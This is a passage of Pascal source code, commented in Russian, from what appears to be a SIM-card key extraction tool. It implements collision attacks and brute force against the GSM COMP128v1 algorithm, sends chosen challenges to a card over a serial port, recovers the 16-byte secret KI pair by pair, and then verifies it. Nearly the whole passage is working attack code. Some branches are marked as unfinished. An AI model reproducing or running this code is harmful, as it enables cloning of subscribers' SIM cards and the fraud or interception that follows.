        end
        else begin
         {Ищем 2R-коллизию для данной пары KI}
         FillChar(IndexCollBuffer^[0][0],4*256*256,$FF);
         SC_Uk  =  0;
         for I  =  0 to $FF do begin
	  R0_after_R1[I][0]  =  Comp128v1_T0[KiVar[CurKiVar][0]+2*I];
	  R0_after_R1[I][1]  =  Comp128v1_T0[2*KiVar[CurKiVar][0]+I];
	 end; 
         for I  =  0 to $FF do begin
	  R8_after_R1[I][0]  =  Comp128v1_T0[KiVar[CurKiVar][1]+2*I];
	  R8_after_R1[I][1]  =  Comp128v1_T0[2*KiVar[CurKiVar][1]+I];
	 end; 
         for CurPair[0]  =  0 to $FF do begin
          for CurPair[1]  =  0 to $FF do begin
           PrS  =  false;
	   PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][0]+2*R8_after_R1[CurPair[1]][0]];
	   PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][0]+R8_after_R1[CurPair[1]][0]];
           Move(PairRes[0],EmulRes[0],2);
	   PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][1]+2*R8_after_R1[CurPair[1]][1]];
	   PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][1]+R8_after_R1[CurPair[1]][1]];
           Move(PairRes[0],EmulRes[2],2);
           if IndexCollBuffer^[EmulRes[0]][EmulRes[1]] == -1 then begin
            CollBuffer^[SC_Uk].B2  =  EmulRes[2];
            CollBuffer^[SC_Uk].B3  =  EmulRes[3];
            CollBuffer^[SC_Uk].Pair  =  CurPair;
            CollBuffer^[SC_Uk].Next  =  -1;
            IndexCollBuffer^[EmulRes[0]][EmulRes[1]]  =  SC_Uk;
            SC_Uk  =  SC_Uk+1;
           end
           else begin
            NextColl  =  IndexCollBuffer^[EmulRes[0]][EmulRes[1]];
            PrevColl  =  -1;
            PrS  =  false;
            while NextColl<>-1 do begin
             if (CollBuffer^[NextColl].B2 == EmulRes[2]) and (CollBuffer^[NextColl].B3 == EmulRes[3]) then begin
              FoundPair1  =  CollBuffer^[NextColl].Pair;
              FoundPair2  =  CurPair;
      	      PrS  =  true;
	      break;
	     end
	     else begin
              PrevColl  =  NextColl;
              NextColl  =  CollBuffer^[NextColl].Next;
	     end;
            end;
	    if NextColl == -1 then begin
	     CollBuffer^[SC_Uk].B2  =  EmulRes[2];
	     CollBuffer^[SC_Uk].B3  =  EmulRes[3];
             CollBuffer^[SC_Uk].Pair  =  CurPair;
             CollBuffer^[SC_Uk].Next  =  -1;
             CollBuffer^[PrevColl].Next  =  SC_Uk;
             SC_Uk  =  SC_Uk+1;
            end;
	   end;
	   if PrS then break;
	  end;
	  if PrS then break;
	 end;    
	 {Проверяем пару по найденной коллизии}
         FillChar(CRand1[0],16,$0);
         FillChar(CRand2[0],16,$0);
 	 CRand1[Pair]  =  FoundPair1[0];
	 CRand1[Pair+8]  =  FoundPair1[1]; 
	 CRand2[Pair]  =  FoundPair2[0];
	 CRand2[Pair+8]  =  FoundPair2[1]; 
         while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,CSRes1)<>0) do ;
         if RetraceFile == '' then begin
          Result  =  Gsm(Port,CRand1,CSRes1);
         end
         else begin
          Result  =  0;
          if Compare2Rands(RetraceRand,CRand1) == false then begin
           LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
           LWriteln('Expected   ==  '+PrintHexData16(CRand1,true),2);
           LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
           LWriteln('',2);
           A5Rv1  =  -1;
           return;
          end;
         end; 
         if (Result<>0) then begin
          A5Rv1  =  -1;
          return;
         end;
         while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,CSRes2)<>0) do ;
         if RetraceFile == '' then begin
          Result  =  Gsm(Port,CRand2,CSRes2);
         end
         else begin
          Result  =  0;
          if Compare2Rands(RetraceRand,CRand2) == false then begin
           LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
           LWriteln('Expected   ==  '+PrintHexData16(CRand2,true),2);
           LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
           LWriteln('',2);
           A5Rv1  =  -1;
           return;
          end;
         end; 
         if (Result<>0) then begin
          A5Rv1  =  -1;
          return;
         end;
         PrS  =  true;
         for J  =  0 to 11 do begin
          if CSRes1[J]<>CSRes2[J] then begin
     	   PrS  =  false;
   	   break;
	  end;
         end;
	 if PrS then begin
	  KiVarGood[CurKiVar]  =  2;
	  PrCollGood  =  true;
	  LWriteln('OK.',2);
	 end
	 else begin
	  LWriteln('Wrong.',2);
	 end; 
        end;
       end; 
       if PrCollGood then begin
        for I  =  1 to 16 do begin
         if KiVarGood[I] == 1 then KiVarGood[I]  =  0;
        end;
       end;
       CurGoodKi  =  0;
       for I  =  1 to 16 do begin
        if KiVarGood[I]<>0 then begin
         CurGoodKi  =  CurGoodKi+1;
         GoodKi[CurGoodKi]  =  KiVar[I];
        end;
       end;
       {Посмотрим, сколько пар KI мы нашли}
       if CurGoodKi == 0 then begin
        LWriteln('Cannot find good KI pair variants. Continue 5R-attack with other two groups.',2);
       end;
       if CurGoodKi == 1 then begin
        LWriteln('Found KI pair  ==  '+PrintHexPair(GoodKi[1],false),2);
        KiPair  =  GoodKi[1];
        Pr5RAttack  =  true;
       end;
       if CurGoodKi>1 then begin
        LWriteln(CharsetUpdate('НЕДОПИСАНО!!! НЕСКОЛЬКО УСПЕШНЫХ ВАРИАНТОВ!!!'),2);
        return;
       end;
      end
      else begin
       LWriteln('Cannot find KI pair variants. Continue 5R-attack with other two groups.',2);
      end;
     end
     else LWriteln(chr($0D),1);     
    end;
    if Pr5RAttack == true then break;
    Cur_Uk  =  Cur_Uk+1;
    if Cur_Uk>(Res_Uk-1) then begin
     if PrStep == false then begin
      PrStep  =  true;
      Cur_Uk  =  0;
     end;
    end;
   end;      
   {Выведем результаты}
   if Pr5RAttack == true then begin
    LWriteln('-------------------------------',2);
    LWriteln('5R-attack OK. KI pair  ==  '+PrintHexPair(KiPair,true)+'. Using '+IntToStr(AllGSMStep)+' GSM steps.',2);
    LWriteln('-------------------------------',2);
   end
   else begin
    LWriteln('-------------------------------',2);
    LWriteln('5R-attack FAILED! Using '+IntToStr(AllGSMStep)+' GSM steps.',2);
    LWriteln('-------------------------------',2);
    Res  =  1;
   end;
   FreeMem(DataBuffer,SizeOf(TA5Rv1_Data));
   FreeMem(IndexBuffer,SizeOf(TA5Rv1_Index));
   FreeMem(CollBuffer,SizeOf(TA5Rv1_Coll));
   FreeMem(IndexCollBuffer,SizeOf(TA5Rv1_CollIndex));
   FreeMem(ResBuffer1,SizeOf(TA5Rv1_Res));
   FreeMem(ResBuffer2,SizeOf(TA5Rv1_Res));
   FreeMem(ResBuffer81,SizeOf(TA5Rv1_Res8));
   FreeMem(ResBuffer82,SizeOf(TA5Rv1_Res8));
   FreeMem(ResBuffer,SizeOf(TA5Rv1_Res16));
   LWriteln('',2);
   A5Rv1  =  Res;
  end; 

 {Функция поиска последней пары по алгоритму Comp128v1}  
 function BForcev1(var Port:TBlockSerial;Pair:byte;KI:TData16;var KIPair:TPair):Longint; 
  var
   Res:Longint;
   I,J:Longint;
   Rand:TData16;
   SRes:TData12;
   Result:Longint;   
   MRand:array[0..15] of TData16;
   MSRes:array[0..15] of TData12;
   CurRes:TData12;
   AllKiFound:Longint;   
   KiVar:array[1..16] of TPair;
   PrS:boolean;
   CurPair:TPair;
   PrBFAttack:boolean;
  begin
   Res  =  0;
   FillChar(KIPair[0],2,$0);
   LWriteln('-------------------------------',2);
   LWriteln('Starting brute force on pair '+IntToStr(Pair)+'...',2);
   LWriteln('-------------------------------',2);
   {Получим несколько (2) ответов карты}
   for J  =  0 to 1 do begin
    while (RetraceFile<>'') and (GetStringFromRetrace(Rand,SRes)<>0) do ;
    if RetraceFile == '' then begin
     for I  =  0 to 15 do Rand[I]  =  Random($100);
     Result  =  Gsm(Port,Rand,SRes);
     if (Result<>0) then begin 
      BForcev1  =  -1;
      return;
     end;
    end; 
    MRand[J]  =  Rand;
    MSRes[J]  =  SRes;
   end;    
   {Исход атаки}   
   PrBFAttack  =  false;
   {Перебираем последнюю пару из KI}
   AllKiFound  =  0;
   for CurPair[0]  =  0 to 255 do begin
    KI[Pair]  =  CurPair[0];
    for CurPair[1]  =  0 to 255 do begin
     KI[Pair+8]  =  CurPair[1];
     PrS  =  true;
     for I  =  0 to 1 do begin
      CurRes  =  Emu_Comp128v1(KI,MRand[I]);
      for J  =  0 to 11 do begin
       if CurRes[J]<>MSRes[I][J] then begin
        PrS  =  false;
	break;
       end;
      end;
      if PrS == false then break;
     end;
     if PrS then begin
      AllKiFound  =  AllKiFound+1;
      KiVar[AllKiFound]  =  CurPair;
     end;
    end;
    if (CurPair[0] and $0F) == $0F then LWrite('.',1);
   end;
   LWriteln(chr($0D),1);
   {Посмотрим, сколько пар KI мы нашли}
   if AllKiFound == 0 then begin
    LWriteln('Cannot find good KI pair variants.',2);
    Res  =  1;
   end;
   if AllKiFound == 1 then begin
    LWriteln('Found KI pair  ==  '+PrintHexPair(KiVar[1],false),2);
    KiPair  =  KiVar[1];
    PrBFAttack  =  true;
   end;
   if AllKiFound>1 then begin
    LWriteln(CharsetUpdate('НЕДОПИСАНО!!! НЕСКОЛЬКО УСПЕШНЫХ ВАРИАНТОВ!!!'),2);
    return;
   end;
   {Выведем результаты}
   if PrBFAttack == true then begin
    LWriteln('-------------------------------',2);
    LWriteln('Brute force OK. KI pair  ==  '+PrintHexPair(KiPair,true)+'. Using '+IntToStr(AllGSMStep)+' GSM steps.',2);
    LWriteln('-------------------------------',2);
   end
   else begin
    LWriteln('-------------------------------',2);
    LWriteln('Brute force FAILED! Using '+IntToStr(AllGSMStep)+' GSM steps.',2);
    LWriteln('-------------------------------',2);
    Res  =  1;
   end;
   LWriteln('',2);
   BForcev1  =  Res;
  end;
  
 {Функция поиска двух последних пар по алгоритму Comp128v1} 
 function BForce2Pv1(var Port:TBlockSerial;Pairs:byte;KI:TData16;var KIPair1,KIPair2:TPair):Longint; 
  var
   Res:longint;
   Pair1,Pair2:byte;
   I,J:Longint;
   Rand:TData16;
   SRes:TData12;
   Result:Longint;   
   MRand:array[0..15] of TData16;
   MSRes:array[0..15] of TData12;
   CurRes:TData12;
   AllKiFound:Longint;   
   KiVar:array[1..16,1..2] of TPair;
   PrS:boolean;
   CurPair1,CurPair2:TPair;
   PrBFAttack:boolean;
   STemp:string;
  begin
   Res  =  0;
   FillChar(KIPair1[0],2,$0);
   FillChar(KIPair2[0],2,$0);
   Pair1  =  Pairs div 10;
   Pair2  =  Pairs mod 10;
   LWriteln('----------------------------------',2);
   LWriteln('Starting brute force on pairs '+IntToStr(Pair1)+','+IntToStr(Pair2)+'...',2);
   LWriteln('----------------------------------',2);
   {Получим несколько (2) ответов карты}
   for J  =  0 to 1 do begin
    while (RetraceFile<>'') and (GetStringFromRetrace(Rand,SRes)<>0) do ;
    if RetraceFile == '' then begin
     for I  =  0 to 15 do Rand[I]  =  Random($100);
     Result  =  Gsm(Port,Rand,SRes);
     if (Result<>0) then begin 
      BForce2Pv1  =  -1;
      return;
     end;
    end; 
    MRand[J]  =  Rand;
    MSRes[J]  =  SRes;
   end;    
   {Исход атаки}   
   PrBFAttack  =  false;
   {Перебираем две пары из KI}
   AllKiFound  =  0;
   LWrite('000/255',1);
   for CurPair1[0]  =  0 to 255 do begin
    KI[Pair1]  =  CurPair1[0];
    for CurPair1[1]  =  0 to 255 do begin
     KI[Pair1+8]  =  CurPair1[1];
     for CurPair2[0]  =  0 to 255 do begin
      KI[Pair2]  =  CurPair2[0];
      for CurPair2[1]  =  0 to 255 do begin
       KI[Pair2+8]  =  CurPair2[1];
       PrS  =  true;
       for I  =  0 to 1 do begin
        CurRes  =  Emu_Comp128v1(KI,MRand[I]);
        for J  =  0 to 11 do begin
         if CurRes[J]<>MSRes[I][J] then begin
          PrS  =  false;
    	  break;
         end;
        end;
        if PrS == false then break;
       end;
       if PrS then begin
        AllKiFound  =  AllKiFound+1;
        KiVar[AllKiFound,1]  =  CurPair1;
	KiVar[AllKiFound,2]  =  CurPair2;
	LWrite('('+PrintHexPair(CurPair1,false)+','+PrintHexPair(CurPair2,false)+')',1);
       end;
      end;
     end;
     if (CurPair1[1] and $03) == $03 then LWrite('.',1);
    end;
    LWriteln(chr($0D),1);
    if CurPair1[0]<>255 then begin
     STemp  =  IntToStr(CurPair1[0]+1);
     while length(STemp)<3 do STemp  =  '0'+STemp;
     LWrite(STemp+'/255',1);
    end; 
   end;      
   LWriteln(chr($0D),1);
   {Посмотрим, сколько пар KI мы нашли}
   if AllKiFound == 0 then begin
    LWriteln('Cannot find good KI pairs variants.',2);
    Res  =  1;
   end;
   if AllKiFound == 1 then begin
    LWriteln('Found KI pairs  ==  '+PrintHexPair(KiVar[1,1],false)+','+PrintHexPair(KiVar[1,2],false),2);
    KiPair1  =  KiVar[1,1];
    KiPair2  =  KiVar[1,2];
    PrBFAttack  =  true;
   end;
   if AllKiFound>1 then begin
    LWriteln(CharsetUpdate('НЕДОПИСАНО!!! НЕСКОЛЬКО УСПЕШНЫХ ВАРИАНТОВ!!!'),2);
    return;
   end;
   {Выведем результаты}
   if PrBFAttack == true then begin
    LWriteln('-------------------------------',2);
    LWriteln('Brute force OK. KI pairs  ==  '+PrintHexPair(KiPair1,true)+', '+PrintHexPair(KiPair2,true)+
     '. Using '+IntToStr(AllGSMStep)+' GSM steps.',2);
    LWriteln('-------------------------------',2);
   end
   else begin
    LWriteln('-------------------------------',2);
    LWriteln('Brute force FAILED! Using '+IntToStr(AllGSMStep)+' GSM steps.',2);
    LWriteln('-------------------------------',2);
    Res  =  1;
   end;
   LWriteln('',2);
   BForce2Pv1  =  Res;
  end;
 
 {Функция проверки KI(v1)} 
 function ChKIv1(var Port:TBlockSerial;KI:TData16):Longint; 
  var
   Res:Longint;
   Pair:byte;
   KIPair:TPair;
   PResult:shortint;
   CollBuffer:PChKIv1_Coll;
   IndexCollBuffer:PChKIv1_CollIndex;
   PrUncol:boolean;
   I,J:Longint;
   SC_Uk:Longint;
   R0_after_R1,R8_after_R1:array[0..255] of TPair;
   CurPair:TPair;
   PairRes:TPair;
   EmulRes:TData4;
   CRand1,CRand2:TData16;
   RetraceRand:TData16;
   CSRes1,CSRes2:TData12;
   PrevColl,NextColl:Longint;
   FoundPair1,FoundPair2:TPair;
   PrS:boolean;
   Result:Longint;
   
  begin
   Res  =  0;
   LWriteln('-------------------------------',2);
   LWriteln('Checking KI...',2);
   LWriteln('-------------------------------',2);
   CollBuffer  =  nil;
   GetMem(CollBuffer,SizeOf(TChKIv1_Coll));
   if CollBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for CollBuffer!',2);
    LWriteln('',2);
    ChKIv1  =  -1;
    return;
   end;
   IndexCollBuffer  =  nil;
   GetMem(IndexCollBuffer,SizeOf(TChKIv1_CollIndex));
   if IndexCollBuffer == nil then begin
    LWriteln('ERROR! Cannot allocate memory for IndexCollBuffer!',2);
    LWriteln('',2);
    ChKIv1  =  -1;
    return;
   end;
   for Pair  =  0 to 7 do begin
    KIPair[0]  =  KI[Pair];
    KIPair[1]  =  KI[Pair+8];
    PResult  =  0;
    {Проверим пару на неколлизионность}
    PrUncol  =  false;
    for I  =  0 to 768 do begin
     if (KiPair[0] == UncolPair_2R_v1[I,0]) and (KiPair[1] == UncolPair_2R_v1[I,1]) then begin 
      PrUncol  =  true;
      break;
     end;
     if (UncolPair_2R_v1[I,0]>KiPair[0]) or 
      ((UncolPair_2R_v1[I,0] == KiPair[0]) and (UncolPair_2R_v1[I,1]>KiPair[1])) then begin
      break; 
     end; 
    end;
    if PrUncol == true then begin
     PResult  =  1;
    end
    else begin        
     {Ищем 2R-коллизию для данной пары KI}
     FillChar(IndexCollBuffer^[0][0],4*256*256,$FF);
     SC_Uk  =  0;
     for I  =  0 to $FF do begin
      R0_after_R1[I][0]  =  Comp128v1_T0[KiPair[0]+2*I];
      R0_after_R1[I][1]  =  Comp128v1_T0[2*KiPair[0]+I];
     end; 
     for I  =  0 to $FF do begin
      R8_after_R1[I][0]  =  Comp128v1_T0[KiPair[1]+2*I];
      R8_after_R1[I][1]  =  Comp128v1_T0[2*KiPair[1]+I];
     end; 
     for CurPair[0]  =  0 to $FF do begin
      for CurPair[1]  =  0 to $FF do begin
       PrS  =  false;
       PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][0]+2*R8_after_R1[CurPair[1]][0]];
       PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][0]+R8_after_R1[CurPair[1]][0]];
       Move(PairRes[0],EmulRes[0],2);
       PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][1]+2*R8_after_R1[CurPair[1]][1]];
       PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][1]+R8_after_R1[CurPair[1]][1]];
       Move(PairRes[0],EmulRes[2],2);
       if IndexCollBuffer^[EmulRes[0]][EmulRes[1]] == -1 then begin
        CollBuffer^[SC_Uk].B2  =  EmulRes[2];
        CollBuffer^[SC_Uk].B3  =  EmulRes[3];
        CollBuffer^[SC_Uk].Pair  =  CurPair;
        CollBuffer^[SC_Uk].Next  =  -1;
        IndexCollBuffer^[EmulRes[0]][EmulRes[1]]  =  SC_Uk;
        SC_Uk  =  SC_Uk+1;
       end
       else begin
        NextColl  =  IndexCollBuffer^[EmulRes[0]][EmulRes[1]];
        PrevColl  =  -1;
        PrS  =  false;
        while NextColl<>-1 do begin
         if (CollBuffer^[NextColl].B2 == EmulRes[2]) and (CollBuffer^[NextColl].B3 == EmulRes[3]) then begin
          FoundPair1  =  CollBuffer^[NextColl].Pair;
          FoundPair2  =  CurPair;
          PrS  =  true;
          break;
         end
         else begin
          PrevColl  =  NextColl;
          NextColl  =  CollBuffer^[NextColl].Next;
         end;
        end;
        if NextColl == -1 then begin
         CollBuffer^[SC_Uk].B2  =  EmulRes[2];
         CollBuffer^[SC_Uk].B3  =  EmulRes[3];
         CollBuffer^[SC_Uk].Pair  =  CurPair;
         CollBuffer^[SC_Uk].Next  =  -1;
         CollBuffer^[PrevColl].Next  =  SC_Uk;
         SC_Uk  =  SC_Uk+1;
        end;
       end;
       if PrS then break;
      end;
      if PrS then break;
     end;    
     {Проверяем пару по найденной коллизии}
     FillChar(CRand1[0],16,$0);
     FillChar(CRand2[0],16,$0);
     CRand1[Pair]  =  FoundPair1[0];
     CRand1[Pair+8]  =  FoundPair1[1]; 
     CRand2[Pair]  =  FoundPair2[0];
     CRand2[Pair+8]  =  FoundPair2[1]; 
     while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,CSRes1)<>0) do ;
     if RetraceFile == '' then begin
      Result  =  Gsm(Port,CRand1,CSRes1);
     end
     else begin
      Result  =  0;
      if Compare2Rands(RetraceRand,CRand1) == false then begin
       LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
       LWriteln('Expected   ==  '+PrintHexData16(CRand1,true),2);
       LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
       LWriteln('',2);
       ChKIv1  =  -1;
       return;
      end;
     end; 
     if (Result<>0) then begin
      ChKIv1  =  -1;
      return;
     end;
     while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,CSRes2)<>0) do ;
     if RetraceFile == '' then begin
      Result  =  Gsm(Port,CRand2,CSRes2);
     end
     else begin
      Result  =  0;
      if Compare2Rands(RetraceRand,CRand2) == false then begin
       LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
       LWriteln('Expected   ==  '+PrintHexData16(CRand2,true),2);
       LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
       LWriteln('',2);
       ChKIv1  =  -1;
       return;
      end;
     end; 
     if (Result<>0) then begin
      ChKIv1  =  -1;
      return;
     end;
     PrS  =  true;
     for J  =  0 to 11 do begin
      if CSRes1[J]<>CSRes2[J] then begin
       PrS  =  false;
       break;
      end;
     end;
     if PrS then PResult  =  2;
    end;
    LWrite('Pair '+IntToStr(Pair)+' - '+PrintHexPair(KiPair,false)+' - ',2); 
    case PResult of
     0:begin
      LWriteln('Wrong.',2);
     end;
     1:begin
      LWriteln('Uncollision.',2);
     end;
     2:begin
      LWriteln('OK.',2);
     end;
    end; 
    if PResult == 0 Then Res  =  1;
   end;
   {Выведем результаты}
   if Res == 0 then begin
    LWriteln('-------------------------------',2);
    LWriteln('KI checking OK. Using '+IntToStr(AllGSMStep)+' GSM steps.',2);
    LWriteln('-------------------------------',2);
   end
   else begin
    LWriteln('-------------------------------',2);
    LWriteln('KI checking FAILED!!!. Using '+IntToStr(AllGSMStep)+' GSM steps.',2);
    LWriteln('-------------------------------',2);
   end;
   FreeMem(CollBuffer,SizeOf(TChKIv1_Coll));
   FreeMem(IndexCollBuffer,SizeOf(TChKIv1_CollIndex));   
   LWriteln('',2);
   ChKIv1  =  Res;
  end; 
 
 {Функция поиска KI по алгоритму Comp128v1}  
 function FindKiv1(var Port:TBlockSerial;Pair:byte;var ResKi:TData16):Longint; 
  var
   Res:Longint;
   Result:Longint;
   KiPair1,KiPair2,KiPair3,KiPair4,KiPair5,KiPair6,KiPair7,KiPair8:TPair;
   Pair2,Pair3,Pair4,Pair5,Pair6,Pair7,Pair8:byte;
   CData:TData8;
      
  begin
   Res  =  0;
   FillChar(ResKi[0],16,$0);
   Result  =  A2Rv1(Port,Pair,KiPair1);
   if Result<>0 then begin
    FindKiv1  =  1;
    return;
   end 
   else begin
    ResKi[Pair]  =  KiPair1[0];
    ResKi[Pair+8]  =  KiPair1[1];
   end;
   Pair2  =  Pair+4;
   if Pair2>7 then Pair2  =  Pair2-8;
   Result  =  A3Rv1(Port,Pair2,KiPair1,KiPair2);
   if Result<>0 then begin
    FindKiv1  =  2;
    return;
   end 
   else begin
    ResKi[Pair2]  =  KiPair2[0];
    ResKi[Pair2+8]  =  KiPair2[1];
   end;   
   Pair3  =  Pair+2;
   if Pair3>7 then Pair3  =  Pair3-8;
   Result  =  A4Rv1(Port,Pair3,KiPair1,KiPair2,KiPair3);
   if Result<>0 then begin
    FindKiv1  =  3;
    return;
   end
   else begin
    ResKi[Pair3]  =  KiPair3[0];
    ResKi[Pair3+8]  =  KiPair3[1];
   end;
   Pair4  =  Pair3+4;
   if Pair4>7 then Pair4  =  Pair4-8;
   Result  =  A3Rv1(Port,Pair4,KiPair3,KiPair4);
   if Result<>0 then begin
    FindKiv1  =  4;
    return;
   end
   else begin
    ResKi[Pair4]  =  KiPair4[0];
    ResKi[Pair4+8]  =  KiPair4[1];
   end;
   Pair5  =  (Pair+1) and $01;
   case Pair of
    0,1:begin
     CData[0]  =  KiPair1[0];CData[4]  =  KiPair1[1];CData[2]  =  KiPair2[0];CData[6]  =  KiPair2[1];
     CData[1]  =  KiPair3[0];CData[5]  =  KiPair3[1];CData[3]  =  KiPair4[0];CData[7]  =  KiPair4[1];
    end; 
    2,3:begin
     CData[0]  =  KiPair4[0];CData[4]  =  KiPair4[1];CData[2]  =  KiPair3[0];CData[6]  =  KiPair3[1];
     CData[1]  =  KiPair1[0];CData[5]  =  KiPair1[1];CData[3]  =  KiPair2[0];CData[7]  =  KiPair2[1];     
    end;
    4,5:begin
     CData[0]  =  KiPair2[0];CData[4]  =  KiPair2[1];CData[2]  =  KiPair1[0];CData[6]  =  KiPair1[1];
     CData[1]  =  KiPair4[0];CData[5]  =  KiPair4[1];CData[3]  =  KiPair3[0];CData[7]  =  KiPair3[1];    
    end;
    6,7:begin
     CData[0]  =  KiPair3[0];CData[4]  =  KiPair3[1];CData[2]  =  KiPair4[0];CData[6]  =  KiPair4[1];
     CData[1]  =  KiPair2[0];CData[5]  =  KiPair2[1];CData[3]  =  KiPair1[0];CData[7]  =  KiPair1[1];
    end;
   end;
   Result  =  A5Rv1(Port,Pair5,CData,KiPair5);
   if Result<>0 then begin
    FindKiv1  =  5;
    return;
   end
   else begin
    ResKi[Pair5]  =  KiPair5[0];
    ResKi[Pair5+8]  =  KiPair5[1];
   end;
   Pair6  =  Pair5+4;
   Result  =  A3Rv1(Port,Pair6,KiPair5,KiPair6);
   if Result<>0 then begin
    FindKiv1  =  6;
    return;
   end 
   else begin
    ResKi[Pair6]  =  KiPair6[0];
    ResKi[Pair6+8]  =  KiPair6[1];
   end;   
   Pair7  =  Pair5+2;
   Result  =  A4Rv1(Port,Pair7,KiPair5,KiPair6,KiPair7);
   if Result<>0 then begin
    FindKiv1  =  7;
    return;
   end 
   else begin
    ResKi[Pair7]  =  KiPair7[0];
    ResKi[Pair7+8]  =  KiPair7[1];
   end;   
   Pair8  =  Pair7+4;
   Result  =  BForcev1(Port,Pair8,ResKi,KiPair8);
   if Result<>0 then begin
    FindKiv1  =  8;
    return;
   end 
   else begin
    ResKi[Pair8]  =  KiPair8[0];
    ResKi[Pair8+8]  =  KiPair8[1];
   end;   
   {Проверим найденный KI}
   Result  =  ChKIv1(Port,ResKi);
   if Result<>0 then Res  =  10;
   FindKiv1  =  Res;
  end;
  
begin
end.
